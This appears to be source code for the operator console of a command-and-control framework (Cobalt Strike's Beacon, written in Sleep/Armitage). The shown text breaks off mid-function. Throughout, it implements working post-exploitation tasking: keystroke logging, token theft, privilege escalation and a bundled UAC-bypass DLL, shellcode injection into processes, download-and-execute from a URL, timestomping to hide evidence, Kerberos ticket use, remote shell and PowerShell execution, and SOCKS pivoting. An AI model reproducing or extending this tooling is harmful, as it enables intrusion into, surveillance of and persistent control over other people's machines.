#
# CRUD for Beacon Tool
#

import msf.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.imageio.*;
import ui.*;
import console.*;
import armitage.*;

import cloudstrike.*;

sub refreshBeacons {
	local('$table $model');
	($table, $model) = @_;
	return fork({
		while (available($source) == 0) {
			local('$interfaces');
			$interfaces = call($mclient, "beacon.list");
			if ($interfaces is $null) {
				print_error("beacon.list is null. Are we still connected?");
				return;
			}

			$interfaces = sort({ return $1['id'] <=> $2['id']; }, $interfaces);

			fork({
				dispatchEvent(lambda({
					local('$interface');
					[$table markSelections];
					[$model clear: 16];
					foreach $interface ($interfaces) {
						[$model addEntry: $interface];
					}

					[$model fireListeners];
					[$table restoreSelections];
				}, \$table, \$model, \$interfaces));
			}, \$table, \$model, \$interfaces);
			sleep(1000);
		}
	}, \$table, \$model, \$mclient);
}

sub beaconPopupListener {
	local('$3');
	if ([$1 isPopupTrigger]) {
		local('$popup $model $note');
		$popup = [new JPopupMenu];

		if ($3) {
			item($popup, "Interact", 'I', lambda({
				local('@entries $id $entry $id $host $pid');
				@entries = [$model getSelectedValuesFromColumns: $table, @('id', 'host', 'pid')];
				foreach $entry (@entries) {
					($id, $host, $pid) = $entry;
					createBeaconConsole($id, "$host $+ @ $+ $pid", $host, $pid);
				}
			}, \$table, \$model));

			separator($popup);

			# keep previous note
			$note = [$model getSelectedValueFromColumn: $table, "note"];
		}

		setupBeaconPopup($popup, $2, $note);

		[$popup show: [$1 getSource], [$1 getX], [$1 getY]];
		[$1 consume];
	}
}

# setupBeaconPopup($popup, @ids);
sub setupBeaconPopup {
	local('$m');

	setupMenu($1, "beacon_top", @($2));

	$m = menu($1, "Log Keystrokes", 'L');
	item($m, "Start", 'S', lambda({
		taskBeaconLogStart(@ids);
	}, @ids => $2));

	item($m, "Stop", 't', lambda({
		taskBeaconLogStop(@ids);
	}, @ids => $2));

	item($1, "Message", 'M', lambda({
		ask_async("What would you like to say?", "", $this);
		yield;
		if ($1 !is $null) {
			taskBeacon(@ids, "windows/messagebox", %(TITLE => "Message", TEXT => $1, EXITFUNC => "process"), $1);
		}
	}, @ids => $2));

	item($1, "Sleep", 'l', lambda({
		local('$time $jitter');
		ask_async("How long should beacon sleep for (seconds jitter%)?", "60", $this);
		yield;
		if ($1 is $null) {
			return;
		}
		else if ($1 ismatch "(\\d+) (\\d+)") {
			($time, $jitter) = matched();
			taskBeaconSleep(@ids, $time, $jitter);
		}
		else if ($1 ismatch "(\\d+)") {
			($time) = matched();
			taskBeaconSleep(@ids, $time, 0);
		}
		else {
			showError("I did not understand $1");
		}
	}, @ids => $2));

	item($1, "Spawn", 'S', lambda({
		_payloadHelper(lambda({
			local('$listener');
			$listener = [$_model getSelectedValueFromColumn: $table, "name"];
			[$dialog setVisible: 0];

			thread(lambda({
				local('%options $payload %metadata');
				%options['listener'] = $listener;
				$payload = fixListenerOptions(%options, %metadata);
				taskBeaconSpawn(@ids, $payload, %options, %metadata);
			}, \@ids, \$listener));
		}, \@ids));
	}, @ids => $2));

	item($1, "Task URL", 'T', lambda({
		local('$msg $exe');
		$exe = "msi_" . (ticks() % 100000) . ".exe";
		ask_async("Provide URL to download and execute:", "", $this);
		yield;
		if ($1 !is $null) {
			taskBeacon(@ids, "windows/download_exec", %(URL => $1, EXE => $exe, EXITFUNC => "process"), $1);
		}
	}, @ids => $2));

	item($1, "Upload", 'U', lambda({
		openFile(lambda({
			if (lof($1) >= (1024 * 1024)) {
				showError("Max Upload via Beacon is 1MB");
			}
			else {
				taskBeaconUpload(@ids, $1);
			}
		}, \@ids), $title => "Select file to upload");
	}, @ids => $2));

	setupMenu($1, "beacon_bottom", @($2));

	separator($1);

	item($1, "Set Note...", 'N', lambda({
		ask_async("Set Beacon Note:", $note, $this);
		yield;

		local('$bid');
		foreach $bid (@ids) { 
			call_async($mclient, "beacon.register", $bid, %(id => $bid, note => "$1"));
		}
	}, @ids => $2, $note => $3));

	separator($1);

	item($1, "Clear", 'C', lambda({
		taskBeaconClear(@ids);
	}, @ids => $2));

	item($1, "Kill", 'K', lambda({
		taskBeaconDie(@ids);
	}, @ids => $2));
}

sub taskBeaconDie {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x03, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to exit\n");
	}
}

sub taskBeaconKerberosUse {
	local('$handle $data $id');

	# open our ticket
	$handle = openf($2);
	$data   = readb($handle, -1);
	closef($handle);

	# task beacon to upload it
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ" . strlen($data), 0x22, strlen($data), $data), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to apply ticket in $2 $+ \n");
	}
}

sub taskBeaconKerberosPurge {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x23, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to purge kerberos tickets\n");
	}
}

sub taskBeaconNop {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x08, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to checkin\n");
	}
}

sub taskBeaconGetuid {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x1B, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Task beacon to get userid\n");
	}
}

sub taskBeaconPWD {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x27, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to print working directory\n");
	}
}

sub taskBeaconRev2self {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x1C, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to revert token\n");
	}
}

sub taskBeaconElevate {
	local('$id $len');
	$len = strlen($2);
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x19, $len, $2), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Task beacon to get SYSTEM\n");
	}
}

sub taskBeaconStealToken {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("III", 0x1F, 4, $2), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to steal token from PID $2\n");
	}
}

sub taskBeaconLogStart {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x06, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to start keystroke logger\n");
	}
}

sub taskBeaconLogStop {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x07, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to stop keystroke logger\n");
	}
}

sub taskBeaconCD {
	local('$id $len');
	$len = strlen($2);
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x05, $len, $2), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] cd $2\n");
	}
}

sub taskBeaconDownload {
	local('$id $len');
	$len = strlen($2);
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x0B, $len, $2), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to download $2\n");
	}
}

sub taskBeaconClear {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.clear", $id); 
		call_async($mclient, "beacon.log_write", $id, "[*] Cleared beacon queue\n");
	}
}

sub taskBeaconPs {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x20, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to list processes\n");
	}
}

sub taskBeaconKill {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIS", 0x21, 2, $2), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to kill $2 $+ \n");
	}
}

sub taskBeaconSleep {
	local('$id');
	foreach $id ($1) {
		if ($2 > 0) {
			call_async($mclient, "beacon.task", $id, pack("IIII", 0x04, 8, $2 * 1000, $3), $MY_ADDRESS);
			if ($3 == 0) {
				call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to sleep for $2 $+ s\n");
			}
			else {
				call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to sleep for $2 $+ s ( $+ $3 $+ % jitter)\n");
			}
		}
		else {
			call_async($mclient, "beacon.task", $id, pack("IIII", 0x04, 8, 100, 90), $MY_ADDRESS);
			call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to become interactive\n");
		}
	}
}

sub bstring {
	local('$len');
	$len = strlen($1);
	return pack("IZ $+ $len", $len, $1);
}

# timestomp, @ids, 
sub taskBeaconTimestomp {
	local('$id $a $b $c');

	$a = bstring($3);
	$b = bstring($2);
	$c = strlen($a . $b);

	# task beacon to timestomp $2 and $3
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $c", 0x1D, $c, $a . $b), $MY_ADDRESS); 
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to timestomp $2 to $3 $+ \n");
	}
}

# @ids, domain, user, pass, command
sub taskBeaconRunAs {
	local('$id $domain $user $pass $len $cmd');

	$domain = bstring($2);
	$user   = bstring($3);
	$pass   = bstring($4);
	$cmd    = bstring($5);
	$len    = strlen($domain . $user . $pass . $cmd);

	# task each beacon to make a token
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x26, $len, $domain . $user . $pass . $cmd), $MY_ADDRESS); 
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to execute: $5 as $2 $+ \\ $+ $3 $+ \n");
	}
}

sub taskBeaconUpload {
	local('$id $name $data $nlen $dlen $handle $len');

	# get all of our data that we're going to upload
	$name   = getFileName($2);
	$nlen   = strlen($name);
	$handle = openf($2);
	$data   = readb($handle, -1);
	$dlen   = strlen($data);
	closef($handle);
	
	# calculate the length of this package
	$len = 4 + $nlen + $dlen;			
	
	# task beacon to upload it
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIIZ $+ $nlen $+ Z $+ $dlen", 0x0A, $len, $nlen, $name, $data), $MY_ADDRESS); 
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to upload $2 $+ \n");
	}
}

sub _extractFunctions {
	local('$line @r');
	foreach $line (split("\n", $1)) {
		$line = ["$line" trim];
		if ($line ismatch '\s*function ([a-zA-Z0-9-]*).*?') {
			push(@r, matched()[0]);
		}
	}

	return @r;
}

sub taskPowerShellImport {
	local('$handle $data $len $id');

	# get all of our data that we're going to upload
	$handle = openf($2);
	$data   = readb($handle, -1);
	$len   = strlen($data);
	closef($handle);

	# task beacon to import it
	foreach $id ($1) {
		# store our powershell functions [for tab completion purposes]
		call_async($mclient, "beacon.set_psh_functions", $id, join(" ", _extractFunctions($data)));

		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), $MY_ADDRESS); 
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to import $2 $+ \n");
	}

}

# so I don't repeat myself.
inline _beaconShellcode {
	call_async_callback($mclient, "module.execute", $this, "payload", $payload, %o);
	yield;
	$data = convertAll($1)['payload'];
}

# @(ids), payload, %otheroptions, whatever
sub taskBeacon {
	[lambda({
		local('$data $len %o $id $k $v $pl $ho $po');

		%o = %(Format => "raw", Encoder => "generic/none", EXITFUNC => "thread", Iterations => "0");
		foreach $k => $v (%options) {
			%o[$k] = "$v";
		}

		# generate our shellcode homez. (populates $data)
		_beaconShellcode();

		# length
		$len  = strlen($data);

		# task the agent(s)...
		foreach $id (@ids) {
			call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x01, $len, $data), $MY_ADDRESS); 
			call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to inject $payload $+ \n");
		}
	}, $payload => $2, %options => $3, @ids => $1, %meta => $4)];
}

# @(ids), payload, %otheroptions, whatever
sub taskBeaconSpawn {
	[lambda({
		local('$data $len %o $id $k $v $pl $ho $po');

		%o = %(Format => "raw", Encoder => "generic/none", EXITFUNC => "thread", Iterations => "0");
		foreach $k => $v (%options) {
			%o[$k] = "$v";
		}

		# generate our shellcode homez. (populates $data)
		_beaconShellcode();

		# length
		$len  = strlen($data);

		($pl, $ho, $po) = values(%meta, @('payload', 'host', 'port'));

		# task the agent(s)...
		foreach $id (@ids) {
			call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x01, $len, $data), $MY_ADDRESS); 
			call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to spawn $pl ( $+ $ho $+ : $+ $po $+ )\n");
		}
	}, $payload => $2, %options => $3, @ids => $1, %meta => $4)];
}

# @(ids), payload, %otheroptions, whatever
sub taskBeaconBypassUAC {
	# sanity check in case something changes later. (related to 64-bit DLL gen logic)
	if (size($1) != 1) {
		warn("BypassUAC only accepts one ID at a time...");
		return;
	}

	[lambda({
		local('$data $len %o $id $k $v $pl $ho $po $b $is64 $list');

		%o = %(Format => "raw", Encoder => "generic/none", EXITFUNC => "thread", Iterations => "0");
		foreach $k => $v (%options) {
			%o[$k] = "$v";
		}

		# get our list of beacons
		call_async_callback($mclient, "beacon.list", $this);
		yield;
		$list = convertAll($1);

		# loop up the 32-bit/64-bit status of this session
		foreach $b ($list) {
			if ($b['id'] eq @ids[0]) {
				$is64 = $b['is64'];
			}
		}

                # generate our DLL to drop and load it into $data
                local('$file $handle $bypass $dlen $blen $dll');
 
                $file = randomArtifactName();
		if ($is64) {
			%o['output'] = "Windows UAC DLL (64-bit)";
		}
		else {
			%o['output'] = "Windows UAC DLL (32-bit)";
		}

		generateSafePayload($file, $payload, %o, $this);
		yield;
		$file = convertAll($1); 

		$handle = openf($file);
		$dll = readb($handle, -1);
		closef($handle);

		deleteFile($file);   # clean it up!

		# grab our bypassuac DLL and prep it.
		$handle = [SleepUtils getIOHandle: resource("resources/bypassuac-x86.dll.enc"), $null];
		$bypass = readb($handle, -1);
		closef($handle);

		# now... let's figure this nonsense out...
		$dlen = strlen($dll);
		$blen = strlen($bypass);

		# build our data package please
		$data = pack("IIZ $+ $dlen $+ Z $+ $blen", $dlen, $blen, $dll, $bypass);
		$len  = strlen($data);

		# get metadata
		($pl, $ho, $po) = values(%meta, @('payload', 'host', 'port'));

		# task the agent(s)...
		foreach $id (@ids) {
			call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x01A, $len, $data), $MY_ADDRESS); 
			call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to spawn $pl ( $+ $ho $+ : $+ $po $+ ) in a high integrity process\n");
		}
	}, $payload => $2, %options => $3, @ids => $1, %meta => $4)];
}

# @(ids), payload, %otheroptions, whatever, pid
sub taskBeaconPid {
	[lambda({
		local('$data $len %o $id $k $v $pl $ho $po');

		%o = %(Format => "raw", Encoder => "generic/none", EXITFUNC => "thread", Iterations => "0");
		foreach $k => $v (%options) {
			%o[$k] = "$v";
		}

		# generate the payload (populates $data)
		_beaconShellcode();

		# length
		$len  = strlen($data);

		($pl, $ho, $po) = values(%meta, @('payload', 'host', 'port'));

		# task the agent(s)...
		foreach $id (@ids) {
			call_async($mclient, "beacon.task", $id, pack("IISZ $+ $len", 0x09, $len + 2, $pid, $data), $MY_ADDRESS); 
			call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to inject $pl ( $+ $ho $+ : $+ $po $+ ) into $pid $+ \n");
		}
	}, $payload => $2, %options => $3, @ids => $1, %meta => $4, $pid => $5)];
}

# @(ids), command + args
sub taskShell {
	local('$id $len');
	$len  = strlen($2);

	# task the agent(s)...
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x02, $len, $2), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
	}
}

# @(ids), command + args
sub taskPowerShell {
	local('$id $len');
	$len  = strlen($2);

	# task the agent(s)...
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
	}
}

# @(ids), command + args
sub taskExecute {
	local('$id $len');
	$len  = strlen($2);

	# task the agent(s)...
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x0C, $len, $2), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to execute: $2 $+ \n");
	}
}

sub taskBeaconSpawnTo {
	local('$id $len');
	$len  = strlen($2);

	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x0D, $len, $2), $MY_ADDRESS);
		if ($2) {
			call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to spawn to: $2 $+ \n");
		}
		else {
			call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to spawn to default process\n");
		}
	}
}

sub taskBeaconMeterpreter {
	thread(lambda({
		local('$port $data $len $id %o');
		$port  = randomPort();

		# generate shellcode...
		%o = %(Format => "raw", Encoder => "generic/none", Iterations => "0", LPORT => $port);
		$data = generateBindShellcode($port);
		$len  = strlen($data);

		# task our beacons...
		foreach $id (@ids) {
			call_async($mclient, "beacon.task", $id, pack("IIII", 0x04, 8, 100, 90), $MY_ADDRESS);
			call_async($mclient, "beacon.task", $id, pack("IISZ $+ $len", 0x012, $len + 2, $port, $data), $MY_ADDRESS); 
			call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to inject meterpreter (bound to $port $+ )\n");
		}
	}, @ids => $1));
}

sub createBeaconConsole {
	local('$console $ccl $cid');
	$cid = int(rand() * 100000);

	$console = [new ActivityConsole: $preferences];
	setupConsoleStyle($console);

	# setup the right log file
	if ($3 is $null) {
		logCheck($console, "all", "beacon_ $+ $1");
	}
	else {
		logCheck($console, $3, "beacon_ $+ $1");
	}

	# define a menu for the eventlog
	[$console setPopupMenu: lambda({
		beaconPopupListener($2, @($id));
	}, $id => $1)];

	[new BeaconTabCompletion: $console, $client, $1, "beacon.tabs", {
		# return a list of listeners...
		local('$l @listeners');
		foreach $l (listeners()) {
			push(@listeners, $l['name']);
			if ("*beacon_dns*" iswm $l['payload']) {
				push(@listeners, $l['name'] . " (DNS)");
			}
		}
		return cast(@listeners, ^String);
	}];

	[[$console getInput] addActionListener: lambda({
		local('$text $src $help $first $second');
		$text = [[$1 getActionCommand] trim];
		$src  = [$1 getSource];
		[$console append: "\Ubeacon\U> $text $+ \n"];
		[$src setText: ""];

		$help = processBeaconHelp();
		if ($text in $help) {
			[$console append: $help[$text]];
		}
		else if ($text eq "exit") {
			taskBeaconDie(@($id));
		}
		else if ($text eq "checkin") {
			taskBeaconNop(@($id));
		}
		else if ($text eq "clear") {
			taskBeaconClear(@($id));
		}
		else if ($text eq "getsystem") {
			local('$service');
			$service = rand(@('ms', 'srv', 'upd', 'kb' 'nt', 't')) . formatNumber(rand(999999), 10, 16);
			taskBeaconElevate(@($id), $service);
		}
		else if ($text eq "getuid") {
			taskBeaconGetuid(@($id));
		}
		else if ($text eq "rev2self") {
			taskBeaconRev2self(@($id));
		}
		else if ($text eq "ps") {
			taskBeaconPs(@($id));
		}
		else if ($text eq "pwd") {
			taskBeaconPWD(@($id));
		}
		else if ($text eq "kerberos_ticket_purge") {
			taskBeaconKerberosPurge(@($id));
		}
		else if ($text eq "kerberos_ticket_use") {
			openFile(lambda({
				taskBeaconKerberosUse(@ids, $1);
			}, @ids => @($id), \$console), $title => "Select ticket to import");
		}
		else if ($text eq "spawnto") {
			taskBeaconSpawnTo(@($id), $null);
		}
		else if ($text eq "meterpreter") {
			[lambda({
				local('$b $host $route $list');

				# list of beacons
				call_async_callback($mclient, "beacon.list", $this);
				yield;
				$list = convertAll($1);

				# loop through and find meterpreter sessions
				foreach $b ($list) {
					if ($b['id'] eq $id) {
						$host = $b['internal'];
					}
				}

				# check if any known pivots apply to our beacon
				foreach $route (@routes) {
					if ([$route shouldRoute: $host]) {
						[$console append: "[-] Remove pivot $route to tunnel meterpreter through Beacon.\n"];
						return;
					}
				}

				taskBeaconMeterpreter(@($id));
			}, \$id, \$console)];
		}
		else if ($text eq "powershell-import") {
			openFile(lambda({
				if (lof($1) >= (1024 * 1024)) {
					[$console append: "[-] max upload size is 1MB\n"];
				}
				else {
					taskPowerShellImport(@ids, $1);
				}
			}, @ids => @($id), \$console), $title => "Select script to import");
		}
		else if ($text eq "upload") {
			openFile(lambda({
				if (lof($1) >= (1024 * 1024)) {
					[$console append: "[-] max upload size is 1MB\n"];
				}
				else {
					taskBeaconUpload(@ids, $1);
				}
			}, @ids => @($id), \$console), $title => "Select file to upload");
		}
		else if ($text ismatch 'timestomp (.*?) (.*?)') {
			($first, $second) = matched();
			taskBeaconTimestomp(@($id), $first, $second);
		}
		else if ($text ismatch 'runas (.*?)\\\\(.*?) (.*?) (.*?)') {
			local('$domain $user $pass $cmd');
			($domain, $user, $pass, $cmd) = matched();
			taskBeaconRunAs(@($id), $domain, $user, $pass, $cmd);
		}
		else if ($text ismatch 'runas (.*?) (.*?) (.*?)') {
			local('$user $pass $cmd');
			($user, $pass, $cmd) = matched();
			taskBeaconRunAs(@($id), ".", $user, $pass, $cmd);
		}
		else if ($text eq "spawn" || $text ismatch 'inject (\d+)' || $text eq "bypassuac") {
			local('$pid');

			if ($text ne "spawn" && $text ne "bypassuac") {
				($pid) = matched()[0];
			}

			_payloadHelper(lambda({
				local('$listener');
				$listener = [$_model getSelectedValueFromColumn: $table, "name"];
				[$dialog setVisible: 0];

				thread(lambda({
					local('$port $payload $l $host %options %metadata');

					# 1. resolve our listener...
					%options['listener'] = $listener;
					$payload = fixListenerOptions(%options, %metadata);

					if ($payload is $null) {
						[$console append: "[-] Could not find listener: $listener $+ \n"];
						return;
					}

					# 2. taskBeacon
					if ($text eq "spawn") {
						taskBeaconSpawn(@($id), $payload, %options, %metadata);
					}
					else if ($text eq "bypassuac") {
						taskBeaconBypassUAC(@($id), $payload, %options, %metadata);
					}
					else {
						taskBeaconPid(@($id), $payload, %options, %metadata, $pid);
					}
				}, \$text, \$console, \$id, \$listener, \$pid));
			}, \$id, \$text, \$console, \$pid));
		}
		else if ($text ismatch '(.*?)\s+(.*)') {
			($first, $second) = matched();
			if ($first eq "sleep") {
				if (" " isin $second) {
					local('$sleep $jitter');
					($sleep, $jitter) = split(" ", $second);
					if ($jitter < 0 || $jitter > 99) {
						[$console append: "[-] acceptable jitter values are 0-99\n"];
						return;
					}
					taskBeaconSleep(@($id), $sleep, $jitter);
				}
				else {
					taskBeaconSleep(@($id), $second, 0);
				}
			}
			else if ($first eq "socks") {
				if ($second eq "stop") {
					call_async($mclient, "beacon.pivot", $id);
				}
				else if (-isnumber $second) {
					call_async($mclient, "beacon.pivot", $id, int($second));
				}
			}
			else if ($first eq "spawnto") {
				taskBeaconSpawnTo(@($id), $second);
			}
			else if ($first eq "cd") {
				taskBeaconCD(@($id), $second);
			}
			else if ($first eq "kerberos_ticket_use") {
				if (!-exists $second) {
					[$console append: "[-] Can not find $second $+ \n"];
				}
				else if (!-canread $second) {
					[$console append: "[-] I can't read $second $+ \n"];
				}
				else if (-isDir $second) {
					[$console append: "[-] $second is a folder!\n"];
				}
				else {
					taskBeaconKerberosUse(@($id), $second);
				}
			}
			else if ($first eq "keylogger") {
				if ($second eq "start") {
					taskBeaconLogStart(@($id));
				}
				else if ($second eq "stop") {
					taskBeaconLogStop(@($id));
				}
				else {
					[$console append: "[-] Do you want to 'start' or 'stop' the keylogger?\n"];
				}
			}
			# steal a token yo
			else if ($first eq "steal_token") {
				taskBeaconStealToken(@($id), $second);
			}
			# link to another beacon (good)
			else if ($first eq "link") {
				local('$plen');
				$plen = strlen($second);
				call_async($mclient, "beacon.task", $id, pack("IIZ $+ $plen", 0x15, $plen, $second), $MY_ADDRESS);
				call_async($mclient, "beacon.log_write", $id, "[*] Tasked to link to ' $+ $second $+ '\n");
			}
			# disconnect parent beacon (need to test)
			else if ($first eq "unlink") {
				call_async($mclient, "beacon.unlink", $id, $second);
			}
			else if ($first eq "message") {
				taskBeacon(@($id), "windows/messagebox", %(TITLE => "Message", TEXT => $second, EXITFUNC => "process"), $second);
			}
			else if ($first eq "kill") {
				taskBeaconKill(@($id), $second);
			}
			else if ($first eq "mode") {
				if ($second eq "dns") {
					call_async($mclient, "beacon.log_write", $id, "[+] data channel set to DNS\n");
					call_async($mclient, "beacon.mode", $id, "dns");
				}
				else if ($second eq "dns-txt") {
					call_async($mclient, "beacon.log_write", $id, "[+] data channel set to DNS-TXT\n");
					call_async($mclient, "beacon.mode", $id, "dns-txt");
				}
				else if ($second eq "http") {
					call_async($mclient, "beacon.log_write", $id, "[+] data channel set to HTTP\n");
					call_async($mclient, "beacon.mode", $id, "http");
				}
				# wait for a connection from another beacon (good)
				else if ($second eq "smb") {
					call_async($mclient, "beacon.log_write", $id, "[+] I will wait for a link from another Beacon\n");
					call_async($mclient, "beacon.task", $id, pack("II", 0x14, 0), $MY_ADDRESS);
				}
				else {
					[$console append: "[-] The mode should be 'dns', 'dns-txt', 'http', or 'smb'\n"];
				}
			}
			else if ($first eq "spawn" || $first eq "inject" || $first eq "bypassuac") {
				thread(lambda({
					local('$listener $port $payload $l $pid $host %options %metadata');

					# 0. reparse our data
					if ($first eq "inject") {
						($pid, $second) = matches($second, '(\d+)\s+(.*)');
					}

					# 1. resolve our listener...
					%options['listener'] = $second;
					$payload = fixListenerOptions(%options, %metadata);

					if ($payload is $null) {
						[$console append: "[-] Could not find listener: $second $+ \n"];
						return;
					}

					# 2. taskBeacon
					if ($first eq "spawn") {
						taskBeaconSpawn(@($id), $payload, %options, %metadata);
					}
					else if ($first eq "bypassuac") {
						taskBeaconBypassUAC(@($id), $payload, %options, %metadata);
					}
					else {
						taskBeaconPid(@($id), $payload, %options, %metadata, $pid);
					}
				}, \$id, \$second, \$console, \$first));
			}
			else if ($first eq "task") {
				local('$exe');
				$exe = "msi_" . (ticks() % 100000) . ".exe";
				taskBeacon(@($id), "windows/download_exec", %(EXE => $exe, URL => $second, EXITFUNC => "process"), $second);
			}
			else if ($first eq "upload") {
				if (!-exists $second) {
					[$console append: "[-] Can not find $second $+ \n"];
				}
				else if (!-canread $second) {
					[$console append: "[-] I can't read $second $+ \n"];
				}
				else if (-isDir $second) {
					[$console append: "[-] $second is a folder!\n"];
				}
				else {
					taskBeaconUpload(@($id), $second);
				}
			}
			else if ($first eq "download") {
				taskBeaconDownload(@($id), $second);
			}
			else if ($first eq "shell") {
				taskShell(@($id), $second);
			}
			else if ($first eq "powershell") {
				taskPowerShell(@($id), $second);
			}
			else if ($first eq "powershell-import") {
				if (!-exists $second) {
					[$console append: "[-] Can not find $second $+ \n"];
				}
				else if (!-canread $second) {
					[$console append: "[-] I can't read $second $+ \n"];
				}
				else if (-isDir $second) {
					[$console append: "[-] $second is a folder!\n"];
				}
				else {
					taskPowerShellImport(@($id), $second);
				}
			}
			else if ($first eq "execute") {
				taskExecute(@($id), $second);
			}
			else {
				[$console append: "[-] Unknown command: $text $+ \n"];
			}
		}
		else {
			[$console append: "[-] Unknown command: $text $+ \n"];
		}
	}, \$console, $id => $1)];

	$ccl = [new ConsoleClient: $console, $mclient, "beacon.log_read", $null, $null, "$cid $+ / $+ $1", 0];

	[$console updatePrompt: "\Ubeacon\U> "];
	[$frame addTab: "Beacon $2", $console, $ccl, "$2"];
}

sub setupTimeRenderer {
	[[$1 getColumn: $2] setCellRenderer: [ATable getTimeTableRenderer]];
}

sub createBeaconBrowser {
	local('$dialog $table $model $interact $delete $timer $help $sorter');
	$dialog = [new JPanel];
	[$dialog setLayout: [new BorderLayout]];

	($table, $model) = setupTable("id", @("external", "internal", "user", "computer", "note", "pid", "last"), @());
	[$table setSelectionMode: [ListSelectionModel MULTIPLE_INTERVAL_SELECTION]];
	setupTimeRenderer($table, "last");

	# sort stuff...
	$sorter = [new javax.swing.table.TableRowSorter: $model];
	[$sorter toggleSortOrder: 0];
	[$table setRowSorter: $sorter];

	# assign some useful sorters... (do this in a separate thread to avoid potential deadlock)
	wait(fork({
		[$sorter setComparator: 0, &compareHosts];
		[$sorter setComparator: 1, &compareHosts];
		[$sorter setComparator: 5, { return long($1) <=> long($2); }];
		[$sorter setComparator: 6, { return long($1) <=> long($2); }];
	}, \$sorter));

	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$interact = [new JButton: "Interact"];
	$delete   = [new JButton: "Remove"];
	$help     = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-beacon")];

	addMouseListener($table, lambda({
		local('@ids');
		@ids = [$model getSelectedValues: $table];
		beaconPopupListener($1, @ids, 1, \$model, \$table);
	}, \$model, \$table));

	$timer = refreshBeacons($table, $model);

	[$interact addActionListener: lambda({
		local('@entries $id $entry $id $host $pid');
		#@ids = [$model getSelectedValues: $table];
		@entries = [$model getSelectedValuesFromColumns: $table, @('id', 'host', 'pid')];
		foreach $entry (@entries) {
			($id, $host, $pid) = $entry;
			createBeaconConsole($id, "$host $+ @ $+ $pid", $host, $pid);
		}
	}, \$table, \$model)];

	[$delete addActionListener: lambda({
		local('@names $name');
